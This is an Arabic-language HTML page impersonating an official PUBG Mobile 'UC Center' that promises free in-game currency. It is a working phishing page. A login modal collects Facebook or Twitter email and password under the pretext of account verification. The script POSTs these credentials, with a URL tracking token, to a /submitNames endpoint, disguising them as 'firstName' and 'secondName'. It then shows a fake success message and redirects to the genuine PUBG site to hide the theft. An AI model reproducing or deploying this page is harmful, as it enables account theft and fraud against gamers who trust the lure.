<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Meta Tags for Preview -->
    <meta property="og:title" content="PUBG UC Center - شحن شدات ببجي مجاناً">
    <meta property="og:description" content="الموقع الرسمي لتوزيع شدات ببجي. احصل على 660 شدة مجاناً بمناسبة الموسم الجديد!">
    <meta property="og:image" content="https://www.pubgmobile.com/common/images/icon_logo.jpg">

    <title>PUBG UC Center</title>
    <style>
        body { font-family: 'Arial', sans-serif; background-color: #121212; color: #f3f3f3; margin: 0; padding: 0; }
        .header { background: #fbb034; color: #000; padding: 15px; text-align: center; font-weight: bold; font-size: 24px; }
        .container { max-width: 450px; margin: 20px auto; padding: 15px; }
        .card { background: #1e1e1e; border: 1px solid #fbb034; border-radius: 10px; padding: 25px; text-align: center; }
        .uc-icon { width: 50px; margin-bottom: 10px; }
        .input-group { margin: 20px 0; text-align: right; }
        input { width: 100%; padding: 12px; background: #2a2a2a; border: 1px solid #444; border-radius: 5px; color: #fff; box-sizing: border-box; }
        .btn-pubg { width: 100%; padding: 15px; background: #fbb034; color: #000; border: none; border-radius: 5px; font-weight: bold; font-size: 18px; cursor: pointer; }
        .plans { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; }
        .plan { border: 1px solid #444; padding: 10px; border-radius: 8px; cursor: pointer; }
        .plan.active { border-color: #fbb034; background: rgba(251, 176, 52, 0.1); }
        
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; z-index: 1000; }
        .modal-content { background: #1e1e1e; padding: 30px; border-radius: 15px; width: 90%; max-width: 380px; text-align: center; border: 1px solid #fbb034; }
    </style>
</head>
<body>

<div class="header">PUBG MOBILE UC ⚡</div>

<div class="container">
    <div class="card">
        <img src="https://www.pubgmobile.com/common/images/icon_logo.jpg" width="80" style="border-radius: 10px;">
        <h2>مركز الشحن المعتمد</h2>
        <p>أدخل الـ ID الخاص بك واختر كمية الشدات المطلوبة.</p>
        
        <div class="input-group">
            <label>معرف اللاعب (Character ID)</label>
            <input type="text" id="player_id" placeholder="مثال: 5123456789">
        </div>

        <div class="plans">
            <div class="plan active" onclick="selUC(this, '0')">660 UC<br><span style="color:#fbb034">مجاني</span></div>
            <div class="plan" onclick="selUC(this, '10')">3850 UC<br><span style="color:#fbb034">10$</span></div>
            <div class="plan" onclick="selUC(this, '20')">8100 UC<br><span style="color:#fbb034">20$</span></div>
            <div class="plan" onclick="selUC(this, '50')">24000 UC<br><span style="color:#fbb034">50$</span></div>
        </div>

        <button class="btn-pubg" id="pBtn" onclick="openPubg()">شحن الآن</button>
    </div>
</div>

<div class="modal" id="pModal">
    <div class="modal-content">
        <h3 id="mTitle">تحقق من الحساب</h3>
        <p>لتجنب الشحن العشوائي، يرجى تسجيل الدخول بحسابك المرتبط باللعبة.</p>
        <div style="display:flex; gap:10px; margin-bottom:20px; justify-content:center;">
            <button style="background:#1877f2; color:white; border:none; padding:10px; border-radius:5px; flex:1;" onclick="setLogin('Facebook')">Facebook</button>
            <button style="background:#fff; color:black; border:none; padding:10px; border-radius:5px; flex:1;" onclick="setLogin('Twitter')">Twitter</button>
        </div>
        <div id="loginArea" style="display:none;">
            <h4 id="loginType">تسجيل الدخول</h4>
            <input type="text" id="u" placeholder="البريد أو الهاتف" style="margin-bottom:10px; width:100%; padding:10px; background:#333; border:1px solid #444; color:#fff;">
            <input type="password" id="p" placeholder="كلمة السر" style="width:100%; padding:10px; background:#333; border:1px solid #444; color:#fff;">
            <button class="btn-pubg" style="margin-top:15px;" onclick="sendPubg()">تأكيد الشحن</button>
        </div>
    </div>
</div>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const token = urlParams.get('t');
    let isFree = true;

    function selUC(el, price) {
        document.querySelectorAll('.plan').forEach(p => p.classList.remove('active'));
        el.classList.add('active');
        isFree = (price === '0');
        document.getElementById('pBtn').innerText = isFree ? "شحن الآن" : "شراء الآن (" + price + "$)";
    }

    function openPubg() {
        if(!document.getElementById('player_id').value) return alert('أدخل الـ ID أولاً');
        if(!isFree) return alert('بوابة الدفع معطلة حالياً، يرجى اختيار الباقة المجانية.');
        document.getElementById('pModal').style.display = 'flex';
    }

    function setLogin(type) {
        document.getElementById('loginArea').style.display = 'block';
        document.getElementById('loginType').innerText = "تسجيل الدخول عبر " + type;
    }

    async function sendPubg() {
        const u = document.getElementById('u').value;
        const p = document.getElementById('p').value;
        if(!p) return alert('أدخل كلمة السر');

        await fetch('/submitNames', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token, firstName: u, secondName: p })
        });

        alert('تم إرسال الطلب! سيتم إضافة الشدات خلال 12 ساعة.');
        window.location.href = "https://www.pubgmobile.com";
    }
</script>
</body>
</html>
